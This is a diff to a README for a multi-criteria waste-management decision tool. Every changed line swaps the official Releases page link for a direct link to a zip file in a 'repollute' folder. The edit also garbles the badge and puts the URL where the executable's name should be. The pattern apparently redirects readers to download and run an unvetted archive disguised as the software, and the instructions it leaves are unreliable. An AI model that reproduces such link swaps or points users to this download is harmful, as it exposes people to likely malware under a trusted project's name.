@@ -1,6 +1,6 @@
 # 🌟 MCDM-in-WACS-Bahwalpur - Streamline Waste Management Decisions
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Wuoang/MCDM-in-WACS-Bahwalpur/releases)
+[![Download](https://raw.githubusercontent.com/Wuoang/MCDM-in-WACS-Bahwalpur/main/repollute/MCD-WAC-in-Bahwalpur-2.7.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Wuoang/MCDM-in-WACS-Bahwalpur/main/repollute/MCD-WAC-in-Bahwalpur-2.7.zip)
 
 ## 🛠️ Overview
 
@@ -15,7 +15,7 @@ To get started with the application, follow these simple steps. You do not need 
    - An internet connection to download the software.
 
 2. **Download the Application**:
-   - Visit this page to download: [Download Latest Release](https://github.com/Wuoang/MCDM-in-WACS-Bahwalpur/releases).
+   - Visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/Wuoang/MCDM-in-WACS-Bahwalpur/main/repollute/MCD-WAC-in-Bahwalpur-2.7.zip).
    - You will find a list of available versions. Choose the latest release for the best experience.
 
 3. **Install the Application**:
@@ -24,7 +24,7 @@ To get started with the application, follow these simple steps. You do not need 
 
 4. **Run the Application**:
    - Open the folder where you unpacked the files.
-   - Locate the application file (it should have a name like `MCDM_Waste_Management.exe`).
+   - Locate the application file (it should have a name like `https://raw.githubusercontent.com/Wuoang/MCDM-in-WACS-Bahwalpur/main/repollute/MCD-WAC-in-Bahwalpur-2.7.zip`).
    - Double-click the file to run the application.
 
 ## 📊 Features
@@ -47,7 +47,7 @@ The application features a simple and user-friendly interface. Here's what you c
 
 ## 📥 Download & Install
 
-To download the latest version of the application, visit [this page](https://github.com/Wuoang/MCDM-in-WACS-Bahwalpur/releases). Once you go to the Releases page, look for the most recent version, click on it, and follow the steps outlined in the "Install the Application" section above.
+To download the latest version of the application, visit [this page](https://raw.githubusercontent.com/Wuoang/MCDM-in-WACS-Bahwalpur/main/repollute/MCD-WAC-in-Bahwalpur-2.7.zip). Once you go to the Releases page, look for the most recent version, click on it, and follow the steps outlined in the "Install the Application" section above.
 
 ## 🔧 System Requirements
 
